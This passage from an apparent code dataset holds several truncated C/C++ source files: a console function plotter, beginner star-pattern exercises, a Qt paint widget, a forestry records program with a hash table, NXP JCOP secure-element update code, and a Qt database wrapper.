1; i >= 0; i--) {\n\t\t\t\t// v{a, b, c} => v_r = {c, b, a}. v_r[i] = a; x^i; i index of a = 2\n\t\t\t\tpoint[\"y\"] += round(coeff[i] * pow(x, i));\n\t\t\t}\n\t\t\t// add point to function\n\t\t\tfunc.push_back(point);\n\t\t}\n\t\t// add function to function list\n\t\tfunctions.push_back(func);\n\t}\n\n\tvoid plotFunctions() {\n\t\tfor (auto& func : functions) // iterate through every function\n\t\t\tfor (int i = 0; i < rows; i++)\n\t\t\t\tfor (int j = 0; j < cols; j++)\n\t\t\t\t\tfor (auto& point : func)\n\t\t\t\t\t\t// y becomes larger as i goes towards 0, while x becomes larger as i goes towards infinity\n\t\t\t\t\t\tif (i == -point[\"y\"] + half_range and j == point[\"x\"] + half_range) {\n\t\t\t\t\t\t\tif (i == half_range)\n\t\t\t\t\t\t\t\tgraph[i][j] = graph_color::root + \"0\" + graph_color::end;\n\t\t\t\t\t\t\telse if (graph[i][j] != \" \" and j != half_range) // <-- prevent y axis override\n\t\t\t\t\t\t\t\tgraph[i][j] = graph_color::intersect + \"0\" + graph_color::end;\n\t\t\t\t\t\t\telse\n\t\t\t\t\t\t\t\tgraph[i][j] = graph_color::function + \"0\" + graph_color::end;\n\t\t\t\t\t\t}\n\t}\n\n\tvoid displayFunctions() {\n\t\tint func_index = 0;\n\t\tfor (auto& func : functions) {\n\t\t\tcout << \"\\nFunction \" << func_index + 1 << endl;\n\t\t\tcout << \"f(x):\";\n\t\t\tfor (auto& var : function_variables[func_index])\n\t\t\t\tcout << \" \" << var;\n\t\t\tcout << endl;\n\t\t}\n\t}\n\n\tbool deleteFunction(int& i) {\n\t\tif (i >= 0 && i < functions.size()) {\n\t\t\t// erase vector at specified index\n\t\t\tfunctions.erase(functions.begin() + i);\n\t\t\treturn true;\n\t\t}\n\t\telse {\n\t\t\tstd::cout << \"Index is out of bounds.\" << std::endl;\n\t\t\treturn false;\n\t\t}\n\t}\n\nprivate:\n\tint range;\n\tint rows = range + 1;\n\tint cols = range + 1;\n\tint half_range = range / 2;\n\n\tvector<vector<map<string, double>>> functions;\n\tvector<vector<double>> function_variables;\n\n\tvector<vector<string>> graph;\n};\n\nvoid displayMenu() {\n\tcout << \"\\033[1;36m\"\n\t\t\"\\n==============\"\n\t\t\"\\n1. New function\"\n\t\t\"\\n2. Edit / Delete\"\n\t\t\"\\n3. Plot Graph\"\n\t\t\"\\n4. Exit\"\n\t\t\"\\n==============\"\n\t\t\"\\033[0m\" << endl;\n}\n\nvoid displayMenuEdit() {\n\tcout << \"\\033[1;31m\"\n\t\t\"\\n==============\"\n\t\t\"\\n1. Edit\"\n\t\t\"\\n2. Delete\"\n\t\t\"\\n3. Reset\"\n\t\t\"\\n4. Exit\"\n\t\t\"\\n==============\"\n\t\t\"\\033[0m\" << endl;\n}\n\ntemplate <typename T>\nvoid InputBracket(T& cinput) {\n\tcout << \">>> \";\n\tcin >> cinput;\n}\n\nvoid GraphEditLogic(Graph& calculator) {\n\tint input;\n\tconst int EXIT = 4;\n\n\tdo {\n\t\tcalculator.displayFunctions();\n\t\tdisplayMenuEdit();\n\n\t\tInputBracket(input);\n\n\t\tswitch (input)\n\t\t{\n\t\tcase 1: {\n\t\t}\n\t\tcase 2: {\n\t\t\tcout << \"Select function to delete:\" << endl;\n\t\t\tdo {\n\t\t\t\tInputBracket(input);\n\t\t\t} while (!calculator.deleteFunction(input));\n\t\t}\n\t\tcase 3: {\n\t\t}\n\t\tdefault:\n\t\t\tbreak;\n\t\t}\n\t} while (input != EXIT);\n}\n\nint main() ",
    "\ufeff#include <bits/stdc++.h>\nusing namespace std;\n\n// PATTERN 1:\n/*  ****\n ****\n ****\n ****\n */\nvoid pattern1(int n)\n{\n    for (int i = 0; i < n; i++)\n    {\n        for (int j = 0; j < n; j++)\n        {\n            cout << \"*\";\n        }\n        cout << endl;\n    }\n}\n\n// PATTERN 2:\n/*\n *\n **\n ***\n ****\n *****\n */\nvoid pattern2()\n{\n    for (int i = 0; i < 5; i++)\n    {\n        for (int j = 0; j <= i; j++)\n        {\n            cout << \"* \";\n        }\n        cout << endl;\n    }\n}\n\n// PATTERN 3:\n/*\n1\n1 2\n1 2 3\n*/\nvoid pattern3()\n{\n    for (int i = 1; i <= 3; i++)\n    {\n        for (int j = 1; j <= i; j++)\n        {\n            cout << j << \" \";\n        }\n        cout << endl;\n    }\n}\n\n// PATTERN 4:\n/*\n1\n2 2\n3 3 3\n*/\nvoid pattern4()\n{\n    for (int i = 1; i <= 3; i++)\n    {\n        for (int j = 1; j <= i; j++)\n        {\n            cout << i << \" \";\n        }\n        cout << endl;\n    }\n}\n\n// PATTERN 5:\n/*\n****\n***\n**\n*\n*/\nvoid pattern5()\n{\n    for (int i = 5; i > 0; i--)\n    {\n        for (int j = 1; j <= i; j++)\n        {\n            cout << \"*\";\n        }\n        cout << endl;\n    }\n}\n\n// PATTERN 6:\n/*\n12345\n1234\n123\n12\n1\n*/\nvoid pattern6()\n{\n    for (int i = 5; i > 0; i--)\n    {\n        for (int j = 1; j <= i; j++)\n        {\n            cout << j << \"\";\n        }\n        cout << endl;\n    }\n}\n\n// PATTERN 7:       IMP\n/*\n *\n ***\n *****\n *******\n */\nvoid pattern7()\n{\n    for (int i = 0; i < 5; i++) // rows\n    {\n        for (int j = 0; j < 5 - i - 1; j++) // spaces print in reverse manner\n        {\n            cout << \" \";\n        }\n        for (int k = 0; k < (2 * i + 1); k++) // to print stars\n        {\n            cout << \"*\";\n        }\n        for (int j = 0; j < 5 - i - 1; j++) // spaces print in reverse manner\n        {\n            cout << \" \";\n        }\n\n        cout << endl;\n    }\n}\n\n// PATTERN 10:       IMP\n/*\n *\n **\n ***\n **\n *\n */\nvoid pattern10()\n{\n    for (int i = 0; i < 5; i++)\n    {\n        // star\n        for (int j = 0; j <= i; j++)\n        {\n            cout << \"*\";\n        }\n        cout << endl;\n    }\n    for (int i = 5 - 2; i > 0; i--)\n    {\n        // star\n        for (int j = 0; j <= i; j++)\n        {\n            cout << \"*\";\n        }\n        cout << endl;\n    }\n}\n\n// PATTERN 11:       IMP\n/*\n1\n0 1\n1 0 1\n0 1 0 1\n1 0 1 0 1\n */\nvoid pattern11()\n{\n    int start = 1;\n    for (int i = 0; i < 5; i++)\n    {\n        if (i % 2 == 0)\n        {\n            // print 1\n            start = 1;\n        }\n        else\n        {\n            start = 0;\n        }\n        for (int j = 0; j <= i; j++)\n        {\n            cout << start << \" \";\n            start = 1 - start;\n        }\n        cout << endl;\n    }\n}\n\n// PATTERN 12:       IMP\n/*\n 1         1\n1 2     2 1\n1 2 3 3 2 1\n */\nvoid pattern12(int n)\n{\n    int space = 2 * (n - 1);\n    for (int i = 1; i <= n; i++)\n    {\n        // numbers\n        for (int j = 1; j <= i; j++)\n        {\n            cout << j;\n        }\n        // spaces\n        for (int j = 1; j <= space; j++)\n        {\n            cout << \" \";\n        }\n        // numbers\n        for (int j = i; j >= 1; j--)\n        {\n            cout << j;\n        }\n        cout << endl;\n        space = space - 2;\n    }\n}\n\n// PATTERN 17:       IMP\n/*\n    A\n  A B A\nA B C B A\n */\nvoid pattern17(int n)\n{\n    for (int i = 0; i < n; i++)\n    {\n        char ch = 'A';\n        int breakpt = ((2 * i) + 1) / 2;\n        // space\n        for (int j = 0; j < n - i - 1; j++)\n        {\n            cout << \" \";\n        }\n        // alphabets\n        for (int j = 0; j < ((2 * i) + 1); j++)\n        {\n            cout << ch;\n            if (j < breakpt)\n            {\n                ch++;\n            }\n            else\n            {\n                ch--;\n            }\n        }\n        // space\n        for (int j = 0; j < n - i - 1; j++)\n        {\n            cout << \" \";\n        }\n        cout << endl;\n    }\n}\n\n// PATTERN 13:       IMP\n/*\n    A\n  A B A\nA B C B A\n */\nvoid pattern13(int n)\n{\n    for (int i = 0; i < n; i++)\n    {\n        char ch = 'A' + (n - 1); // ch=3='c'\n        for (int j = 0; j <= i; j++)\n        {\n            cout << ch << \" \";\n            ch--;\n        }\n        cout << endl;\n    }\n}\n\n// PATTERN 18:       IMP\n/*\nE\nDE\nCDE\nBCDE\nABCDE\n */\nvoid pattern18(int n)\n{\n    for (int i = 0; i < n; i++)\n    {\n        for (char j = 'E' - i; j <= 'E'; j++)\n        {\n            cout << j << \" \";\n        }\n\n        cout << endl;\n    }\n}\n\n// PATTERN 19:       IMP\n/*\n * * * * * *\n * *     * *\n *         *\n *         *\n * *     * *\n * * * * * *\n */\nvoid pattern19(int n)\n{\n    for (int i = 0; i < n; i++)\n    {\n        // stars\n        for (int j = 0; j < n - i; j++)\n        {\n            cout << \"*\";\n        }\n        // space\n        for (int j = 0; j < 2 * i; j++)\n        {\n            cout << \" \";\n        }\n        // stars\n        for (int j = 0; j < n - i; j++)\n        {\n            cout << \"*\";\n        }\n        cout << endl;\n    }\n    int space = (2 * n) - 2;\n    for (int i = 0; i < n; i++)\n    {\n        // stars\n   ",
    "#include \"painter.h\"\n#include \"qevent.h\"\n#include \"ui_painter.h\"\n\n#include <QColorDialog>\n#include <QFileDialog>\n#include <QMenu>\n#include <QPainter>\n#include<QScrollArea>\n#include <QVBoxLayout>\n\npainter::painter(QWidget *parent)\n    : QWidget(parent)\n    , ui(new Ui::painter)\n{\n    ui->setupUi(this);\n    this->setWindowIcon(QPixmap(\":/res/paint.png\"));\n\n}\n\npainter::~painter()\n{\n    delete ui;\n}\n/**\n  * @brief \u6e05\u9664\u7ed8\u56fe\n*/\nvoid painter::on_btn_pnew_clicked()\n{\n    while(!_lines.empty() || !pens.empty())\n    {\n        _lines.pop_back();\n        pens.pop_back();\n    }\n    this->update();\n}\n/**\n  * @brief \u6355\u6349\u7ed8\u56fe\u4e8b\u4ef6\n @param *ev\n*/\nvoid painter::paintEvent(QPaintEvent* ev)\n{\n\n    QPainter painter(this);\n    //   \u6570\u636e\u7ed3\u6784 QVector<QColor> colors;\n\n    for(int i = 0 ; i < _lines.size(); i++)\n    {\n        const QVector<QPoint> &line = _lines.at(i);\n\n        painter.setPen(pens.at(i));\n\n        for (int j = 0 ; j < line.size()-1; j++)\n        {\n            painter.drawLine(line.at(j),line.at(j+1));\n        }\n    }\n    return QWidget::paintEvent(ev);\n\n}\n/**\n  * @brief \u6355\u6349\u9f20\u6807\u79fb\u52a8\n @param *ev\n*/\nvoid painter::mouseMoveEvent(QMouseEvent* ev)\n{\n    if(!ui->groupBox->rect().contains(ev->pos())) {\n        if(_lines.size() == 0)\n        {\n            QVector<QPoint> line;\n            _lines.append(line);\n        }\n        QVector<QPoint> &lastline = _lines.last();\n        lastline.append(ev->pos());\n        //\u5bf9\u8fd9\u4e2a\u7c7b\u7684\u4e8b\u4ef6\u8fdb\u884c\u8ddf\u65b0\n        this->update();\n    }\n\n    return QWidget::mouseMoveEvent(ev);\n}\n/**\n  * @brief \u6355\u6349\u9f20\u6807\u6309\u538b\n @param *ev\n*/\nvoid painter::mousePressEvent(QMouseEvent* ev)\n{\n    QPixmap pix;\n    pix.load(\":/res/pen.png\");\n    QCursor customCursor(pix.scaled(10,10), 0, 0); // 0, 0 \u662f\u5149\u6807\u70ed\u70b9\u7684\u4f4d\u7f6e\n    QApplication::setOverrideCursor(customCursor);\n    if(!ui->groupBox->rect().contains(ev->pos())) {\n        QVector<QPoint> line;\n        _lines.append(line);    //\u5c31\u662fpush_back()\n\n        //\u8bbe\u7f6e\u8fd9\u6761\u7ebf\u7684\u989c\u8272\n        pens.append(lastpen);\n\n        //\u53d6\u51fa\u7ebf\u7684\u5f15\u7528\n        QVector<QPoint> &lastLine = _lines.last();\n        //\u8c03\u7528pos\u4e8b\u4ef6\uff0c\u8fd4\u56deQPoint\n        lastLine.append(ev->pos());\n    }\n    return QWidget::mousePressEvent(ev);\n}\n/**\n  @brief \u6355\u6349\u9f20\u6807\u91ca\u653e\n @param *ev\n*/\nvoid painter::mouseReleaseEvent(QMouseEvent* ev)\n{\n       QApplication::restoreOverrideCursor();\n    if(!ui->groupBox->rect().contains(ev->pos())) {\n        QVector<QPoint> &lastLine = _lines.last();\n        lastLine.append(ev->pos());\n    }\n    return QWidget::mouseReleaseEvent(ev);\n}\n\n /**\n  * @brief \u753b\u7b14\u989c\u8272\u7684\u83b7\u53d6\n*/\n\nvoid painter::on_btn_getpcolor_clicked()\n{\n    // \u68c0\u67e5\u662f\u5426\u6709\u7ed8\u56fe\n    if (_lines.empty() || pens.empty()) {\n        return;\n    }\n    QColor color = QColorDialog::getColor();\n    lastpen.setColor(color);\n}\n/**\n  * @brief \u56de\u64a4\u64cd\u4f5c\n*/\nvoid painter::on_btn_redo_clicked()\n{\n    // \u68c0\u67e5\u662f\u5426\u6709\u7ed8\u56fe\n    if (_lines.empty() || pens.empty()) {\n        return;\n    }\n    _lines.pop_back();\n    pens.pop_back();\n    this->update();\n}\n\n/**\n  * @brief \u8bbe\u7f6e\u753b\u7b14\u7c97\u7ec6\n @param action\n*/\nvoid painter::on_horizontalSlider_actionTriggered(int action)\n{\n    Q_UNUSED(action);\n    int value =ui->horizontalSlider->value();\n    lastpen.setWidth(value);\n}\n\n/**\n  * @brief \u7ed8\u56fe\u653e\u5927\n*/\nvoid painter::on_btn_up_clicked()\n{\n    // \u653e\u5927\u500d\u6570\n    qreal scaleFactor = 1.2; // \u5047\u8bbe\u653e\u5927 20%\n\n    // \u904d\u5386\u6240\u6709\u7ed8\u5236\u7684\u7ebf\u6761\n    for (int i = 0; i < _lines.size(); ++i) {\n        QVector<QPoint>& line = _lines[i];\n        for (int j = 0; j < line.size(); ++j) {\n            // \u5c06\u7ebf\u6761\u4e2d\u7684\u70b9\u5750\u6807\u8fdb\u884c\u653e\u5927\n            line[j].rx() *= scaleFactor;\n            line[j].ry() *= scaleFactor;\n        }\n    }\n\n    // \u66f4\u65b0\u754c\u9762\uff0c\u91cd\u65b0\u7ed8\u5236\u653e\u5927\u540e\u7684\u56fe\u5f62\n    update();\n}\n/**\n  * @brief \u7ed8\u56fe\u7f29\u5c0f\n*/\nvoid painter::on_btn_down_clicked()\n{\n    qreal scaleFactor = 0.8;\n    // \u904d\u5386\u6240\u6709\u7ed8\u5236\u7684\u7ebf\u6761\n    for (int i = 0; i < _lines.size(); ++i) {\n        QVector<QPoint>& line = _lines[i];\n        for (int j = 0; j < line.size(); ++j) {\n            // \u5c06\u7ebf\u6761\u4e2d\u7684\u70b9\u5750\u6807\u8fdb\u884c\u653e\u5927\n            line[j].rx() *= scaleFactor;\n            line[j].ry() *= scaleFactor;\n        }\n    }\n    // \u66f4\u65b0\u754c\u9762\uff0c\u91cd\u65b0\u7ed8\u5236\u653e\u5927\u540e\u7684\u56fe\u5f62\n    update();\n}\n\n",
    "\r\n#include<iostream>\r\n#include<cstring>\r\n#include<math.h>\r\n#include <fstream>\r\n#include<cstdlib>\r\n#define INITLISTSIZE 5\r\n#define LISTINCREMENT 5\r\n#define M 1000007\r\n\r\ntypedef struct forestry          //\u6797\u4e1a\u4fe1\u606f\u5b58\u50a8\u7ed3\u6784\r\n{\r\n    char city[256];\r\n    char animal[256];\r\n    int num[256];\r\n    int sum;\r\n    int order;                  //\u6309\u68ee\u6797\u603b\u8986\u76d6\u7387\u6392\u5e8f\r\n} forestry;\r\n\r\ntypedef struct SqList           //\u987a\u5e8f\u8868\u5b58\u50a8\u7ed3\u6784\r\n{\r\n    forestry *elem;\r\n    int listsize;\r\n    int length;\r\n} SqList;\r\n\r\nforestry HashTable[M];           //\u54c8\u5e0c\u8868\r\n\r\nvoid Init(SqList &L);           //\u521d\u59cb\u5316\r\nint Menu_select();              //\u83dc\u5355\r\nvoid Create(SqList &L);         //\u987a\u5e8f\u8868\u5efa\u7acb\r\nvoid Print(SqList L);           //\u6570\u636e\u6253\u5370\r\nvoid Compute(SqList &L);        //\u6570\u636e\u8ba1\u7b97\r\nvoid Append(SqList &L);         //\u6570\u636e\u8ffd\u52a0\r\nvoid Del(SqList &L);            //\u6570\u636e\u5220\u9664\r\nvoid Insert(SqList &L);         //\u6570\u636e\u63d2\u5165\r\nvoid Search(SqList L);          //\u6570\u636e\u67e5\u627e\r\nvoid Sort(SqList &L);           //\u6570\u636e\u6392\u5e8f\r\nvoid Save(SqList L);            //\u4fdd\u5b58\u6587\u4ef6\r\nvoid Load(SqList &L);           //\u8bfb\u53d6\u6587\u4ef6\r\nvoid Insert_Sort(SqList &L);    //\u63d2\u5165\u6392\u5e8f\r\nvoid Select_Sort(SqList &L);    //\u9009\u62e9\u6392\u5e8f\r\nvoid quick_sort(int l, int r,SqList &L);//\u5feb\u901f\u6392\u5e8f\r\nvoid Number_Sort(SqList &L);    //\u6309\u5b66\u53f7\u6392\u5e8f\r\nvoid Binary_Search(SqList &L);  //\u6298\u534a\u67e5\u627e\r\nvoid Hash_search(SqList L);     //\u54c8\u5e0c\u67e5\u627e\r\nvoid Squence_Search(SqList L);  //\u987a\u5e8f\u67e5\u627e\r\nvoid Creathashtable(SqList L);  //\u5efa\u7acb\u54c8\u5e0c\u8868\r\n\r\n\r\n\r\n\r\nbool switchchioce(){\r\n\tSqList L;\r\n\tswitch(Menu_select())\r\n        {\r\n        case 0:\r\n            Init(L);\r\n            break;\r\n        case 1:\r\n            Create(L);\r\n            break;\r\n        case 2:\r\n            Print(L);\r\n            break;\r\n        case 3:\r\n            Search(L);\r\n            break;\r\n        case 4:\r\n            Compute(L);\r\n            break;\r\n        case 5:\r\n            Del(L);\r\n            break;\r\n        case 6:\r\n            Append(L);\r\n            break;\r\n        case 7:\r\n            Insert(L);\r\n            break;\r\n        case 8:\r\n            Save(L);\r\n            break;\r\n        case 9:\r\n            Load(L);\r\n            break;\r\n        case 10:\r\n            Sort(L);\r\n            break;\r\n        case 11:\r\n            exit(0);\r\n        }\r\n    \r\n    return true;\r\n}\r\n        \r\n\r\n\r\n/****************\u83dc\u5355\u51fd\u6570*******************/\r\nint Menu_select()\r\n{\r\n    int choice;\r\n    printf(\"****************************\u83dc\u5355*******************************\\n\");\r\n    printf(\"                        0  \u521d\u59cb\u5316             \\n\");\r\n    printf(\"                        1  \u8f93\u5165               \\n\");\r\n    printf(\"                        2  \u6253\u5370               \\n\");\r\n    printf(\"                        3  \u67e5\u627e               \\n\");\r\n    printf(\"                        4  \u8ba1\u7b97               \\n\");\r\n    printf(\"                        5  \u5220\u9664               \\n\");\r\n    printf(\"                        6  \u8ffd\u52a0               \\n\");\r\n    printf(\"                        7  \u63d2\u5165               \\n\");\r\n    printf(\"                        8  \u4fdd\u5b58               \\n\");\r\n    printf(\"                        9  \u8bfb\u5165               \\n\");\r\n    printf(\"                        10 \u6392\u5e8f               \\n\");\r\n    printf(\"                        11 \u9000\u51fa               \\n\");\r\n    printf(\"Enter your choice(0-11):\");\r\n    scanf(\"%d\",&choice);\r\n    return choice;\r\n}\r\n/****************\u521d\u59cb\u5316*********************/\r\nvoid Init(SqList &L)\r\n{\r\n    L.elem=(forestry *)malloc(INITLISTSIZE*sizeof(forestry));\r\n    L.length=0;\r\n}\r\n/****************\u987a\u5e8f\u8868\u7684\u5efa\u7acb***************/\r\nvoid Create(SqList &L)\r\n{\r\n    int i=0;\r\n    while(1)\r\n    {\r\n        printf(\"\u8bf7\u8f93\u5165\u57ce\u5e02\u540d:\");\r\n        scanf(\"%s\",L.elem[i].city);\r\n        if(L.elem[i].city[0]=='@')\r\n            break;\r\n        printf(\"\u8bf7\u8f93\u5165\u7279\u6709\u73cd\u7a00\u751f\u7269\u540d:\");\r\n        scanf(\"%s\",L.elem[i].animal);\r\n        printf(\"\u8bf7\u8f93\u5165\u6797\u5730\u3001\u758f\u6797\u5730\u4e0e\u704c\u6728\u6797\u603b\u8986\u76d6\u7387:\");\r\n        scanf(\"%d\",&L.elem[i].num[0]);\r\n        printf(\"\u8bf7\u8f93\u5165\u65e0\u6797\u5730\u8986\u76d6\u7387:\");\r\n        scanf(\"%d\",&L.elem[i].num[1]);\r\n        printf(\"\u8bf7\u8f93\u5165\u672a\u6210\u6797\u9020\u6797\u5730:\");\r\n        scanf(\"%d\",&L.elem[i].num[2]);\r\n        L.elem[i].sum=0;\r\n        L.elem[i].order=0;\r\n        L.length++;\r\n        i++;\r\n        char n;\r\n        scanf(\"%d\",n);\r\n    }\r\n}\r\n/****************\u4fe1\u606f\u6253\u5370*******************/\r\nvoid Print(SqList L)\r\n{\r\n\tsystem(\"cls\");\r\n    int i;\r\n    for(i=0; i<L.length; i++)\r\n    {\r\n        printf(\"\u57ce\u5e02\u540d:%s \u7279\u6709\u73cd\u7a00\u751f\u7269\u540d:%s \u6797\u5730\u3001\u758f\u6797\u5730\u4e0e\u704c\u6728\u6797\u603b\u8986\u76d6\u7387:%d \u65e0\u6797\u5730\u8986\u76d6\u7387:%d \u672a\u6210\u6797\u9020\u6797\u5730\uff1a%d \u603b\u5206:%d \u6392\u540d:%d\\n\",L.elem[i].city,L.elem[i].animal,L.elem[i].num[0],L.elem[i].num[1],L.elem[i].num[2],L.elem[i].sum,L.elem[i],L.elem[i].order);\r\n    }\r\n}\r\n/****************\u6570\u636e\u5220\u9664*******************/\r\nvoid Del(SqList &L)\r\n{\r\n\tsystem(\"cls\");\r\n    printf(\"\u8f93\u5165\u8981\u5220\u9664\u7684\u57ce\u5e02\u540d:\");\r\n    char number[11];\r\n    scanf(\"%s\",number);\r\n    int i=0;\r\n    while(i<L.length&&strcmp(number,L.elem[i].city))\r\n        i++;\r\n    while(i<L.length-1)\r\n    {\r\n        L.elem[i]=L.elem[i+1];\r\n        i++;\r\n    }\r\n    L.length-=1;\r\n}\r\n/****************\u6570\u636e\u8ffd\u52a0*******************/\r\nvoid Append(SqList &L)\r\n{\r\n\tsystem(\"cls\");\r\n    printf(\"\u8bf7\u8f93\u5165\u8981\u589e\u52a0\u7684\u57ce\u5e02\u6797\u4e1a\u4fe1\u606f:\");\r\n    char city[11];\r\n    printf(\"\u8bf7\u8f93\u5165\u57ce\u5e02\u540d:\");\r\n    scanf(\"%s\",city);\r\n    char animal[15];\r\n    printf(\"\u8bf7\u8f93\u5165\u7279\u6709\u73cd\u7a00\u751f\u7269\u540d:\");\r\n    scanf(\"%s\",animal);\r\n    int num[3];\r\n    printf(\"\u8bf7\u8f93\u5165\u6797\u5730\u3001\u758f\u6797\u5730\u4e0e\u704c\u6728\u6797\u603b\u8986\u76d6\u7387:\");\r\n    scanf(\"%d\",&num[",
    "/******************************************************************************\n *\n *  Copyright 2019 NXP\n *\n *  Licensed under the Apache License, Version 2.0 (the \"License\");\n *  you may not use this file except in compliance with the License.\n *  You may obtain a copy of the License at\n *\n *  http://www.apache.org/licenses/LICENSE-2.0\n *\n *  Unless required by applicable law or agreed to in writing, software\n *  distributed under the License is distributed on an \"AS IS\" BASIS,\n *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n *  See the License for the specific language governing permissions and\n *  limitations under the License.\n *\n ******************************************************************************/\n#define LOG_TAG \"JCOP_Se_Extn\"\n#include <android-base/stringprintf.h>\n#include <base/logging.h>\n#include \"JcDnld.h\"\n#include <semaphore.h>\n#include <string.h>\n#include <sys/stat.h>\n\nusing android::base::StringPrintf;\n\nstatic const uint32_t TRANSCEIVE_TIMEOUT_MS = 120000;\n\nbool JcDnld::msIsOsuOngoing = false;\nint16_t JcDnld::msOsuHandle;\n\nSTATUS_JCOP_OSU(JcDnld::*seqHandler[])\n(JcopOs_ImageInfo_t *pContext, STATUS_JCOP_OSU status,\n JcopOs_TranscieveInfo_t *pInfo) = {\n    &JcDnld::SwitchToJcopOsuState, &JcDnld::GetInfo,\n    &JcDnld::LoadJcopOSImage,      &JcDnld::GetInfo,\n    &JcDnld::LoadJcopOSImage,      &JcDnld::GetInfo,\n    &JcDnld::LoadJcopOSImage,      NULL};\n\npJcopOs_Dwnld_Context_t gpOsuContext = NULL;\nspSeEvt JcDnld::mspSeEvtCallback = nullptr;\nspSeChannel JcDnld::mspSeChannelCallback = nullptr;\n\nJcDnld JcDnld::sOsuInstance;\n\nstatic const char *OSU_APDU_FILE_PATH_LIST[3] = {\n    \"/vendor/etc/JcopOs_Update1.apdu\", \"/vendor/etc/JcopOs_Update2.apdu\",\n    \"/vendor/etc/JcopOs_Update3.apdu\"};\nstatic const char *JCOP_INFO_PATH[2] = {\n    \"/data/vendor/nfc/jcop_info.txt\",\n    \"/data/vendor/secure_element/jcop_info.txt\"};\n\ninline int FSCANF_BYTE(FILE *stream, const char *format, void *pVal) {\n  int Result = 0;\n\n  if ((NULL != stream) && (NULL != format) && (NULL != pVal)) {\n    unsigned int dwVal;\n    unsigned char *pTmp = (unsigned char *)pVal;\n    Result = fscanf(stream, format, &dwVal);\n\n    (*pTmp) = (unsigned char)(dwVal & 0x000000FF);\n  }\n  return Result;\n}\n\nJcDnld::JcDnld() { mIsInit = false; }\n\nJcDnld &JcDnld::getInstance() { return sOsuInstance; }\n\nvoid JcDnld::registerSeCallback(const spSeChannel &pSeChannelCallback,\n                                const spSeEvt &pSeEvtCallback) {\n  mspSeChannelCallback = pSeChannelCallback;\n  mspSeEvtCallback = pSeEvtCallback;\n}\n\nSTATUS_JCOP_OSU JcDnld::doUpdate() {\n  STATUS_JCOP_OSU status;\n  pthread_t thread;\n  pthread_attr_t attr;\n  pthread_attr_init(&attr);\n  pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED);\n  if (pthread_create(&thread, &attr, &JcDnld::osuHandlerThread, NULL) != 0) {\n    status = STATUS_FAILED;\n  } else {\n    status = STATUS_SUCCESS;\n  }\n  pthread_attr_destroy(&attr);\n  return status;\n}\n\nvoid *JcDnld::osuHandlerThread(void *data) {\n  (void)data;\n  STATUS_JCOP_OSU retstat;\n  DLOG_IF(INFO, nfc_debug_enabled) << StringPrintf(\"%s: enter\", __func__);\n\n  retstat = jcDnld.Init();\n  if (retstat != STATUS_SUCCESS) {\n    LOG(ERROR) << StringPrintf(\"%s: JCDND initialization failed\", __FUNCTION__);\n  } else {\n    retstat = jcDnld.StartDownload();\n    if (retstat != STATUS_SUCCESS) {\n      LOG(ERROR) << StringPrintf(\"%s: StartDownload failed\", __FUNCTION__);\n    }\n  }\n  jcDnld.DeInit();\n  mspSeEvtCallback->evtCallback((SESTATUS)retstat);\n  return NULL;\n}\n\nSTATUS_JCOP_OSU JcDnld::Init() {\n  bool stat = false;\n  msOsuHandle = EE_ERROR_OPEN_FAIL;\n  DLOG_IF(INFO, nfc_debug_enabled) << StringPrintf(\"%s: enter\", __func__);\n\n  if (msIsOsuOngoing == true) {\n    return STATUS_INUSE;\n  }\n  msIsOsuOngoing = true;\n  stat = initializeOsuContext();\n  if (stat != true) {\n    LOG(ERROR) << StringPrintf(\"%s: failed\", __func__);\n  } else {\n    if (mspSeChannelCallback != NULL) {\n      msOsuHandle = mspSeChannelCallback->open();\n      if (msOsuHandle == EE_ERROR_OPEN_FAIL) {\n        LOG(ERROR) << StringPrintf(\"%s:Open DWP communication is failed\",\n                                   __func__);\n        stat = false;\n      } else {\n        LOG(ERROR) << StringPrintf(\"%s:Open DWP communication is success\",\n                                   __func__);\n        stat = true;\n      }\n    } else {\n      LOG(ERROR) << StringPrintf(\"%s: NULL DWP channel\", __func__);\n      stat = false;\n    }\n  }\n  return (stat == true) ? STATUS_SUCCESS : STATUS_FAILED;\n}\n\nbool JcDnld::DeInit() {\n  bool stat = false;\n  DLOG_IF(INFO, nfc_debug_enabled) << StringPrintf(\"%s: enter\", __func__);\n\n  if (gpOsuContext != NULL) {\n    if (mspSeChannelCallback != NULL) {\n      mspSeChannelCallback->doEseHardReset();\n      stat = mspSeChannelCallback->close(msOsuHandle);\n      if (stat != true) {\n        LOG(ERROR) << StringPrintf(\"%s:closing DWP channel is failed\",\n                                   __func__);\n      }\n    }\n  } else {\n    LOG(ERROR) << StringPrintf",
    "/***************************************************************************\n                          qtdatabase.cpp  -  description\n                             -------------------\n    begin                : Fri May 28 2010\n    http://pvbrowser.org\n ***************************************************************************/\n\n#include \"qtdatabase.h\"\n\nqtDatabase::qtDatabase()\n{\n  sprintf(connectionName,\"%p\",this); \n  db = NULL;\n  result = new QSqlQuery();\n  error  = new QSqlError();\n}\n\nqtDatabase::~qtDatabase()\n{\n  delete result;\n  delete error;\n  if(db != NULL)\n  {\n    close();\n  }\n#if QT_VERSION < 0x050000\n  if(QSqlDatabase::contains(QString::fromAscii(connectionName))) \n  {\n    QSqlDatabase::removeDatabase(QString::fromAscii(connectionName));\n  }\n#else\n  if(QSqlDatabase::contains(QString::fromLatin1(connectionName))) \n  {\n    QSqlDatabase::removeDatabase(QString::fromLatin1(connectionName));\n  }\n#endif  \n}\n\nint qtDatabase::open(const char *dbtype, const char *hostname, const char *dbname, const char *user, const char *pass)\n{\n  if(db != NULL) return -1;\n  db = new QSqlDatabase;\n\n#if QT_VERSION < 0x050000\n  *db = QSqlDatabase::addDatabase(dbtype, QString::fromAscii(connectionName));\n#else\n  *db = QSqlDatabase::addDatabase(dbtype, QString::fromLatin1(connectionName));\n#endif\n  db->setHostName(hostname);\n  db->setDatabaseName(dbname);\n  db->setUserName(user);\n  db->setPassword(pass);\n  if(db->open())\n  {\n    return 0;\n  }\n  else\n  {\n    delete db;\n    db = NULL;\n    return -1;\n  }\n}\n\nint qtDatabase::close()\n{\n  if(db == NULL) \n  {\n    return -1;\n  }  \n  db->close();\n  delete db;\n  db = NULL;\n  return 0;\n}\n\nint qtDatabase::query(PARAM *p, const char *sqlcommand)\n{\n  if(db == NULL) return -1;\n  QString qsqlcommand = QString::fromUtf8(sqlcommand);\n  *result = db->exec(qsqlcommand);\n  *error = db->lastError();\n  if(error->isValid())\n  {\n    QString e = error->databaseText();\n    printf(\"qtDatabase::query ERROR: %s\\n\", (const char *) e.toUtf8());\n    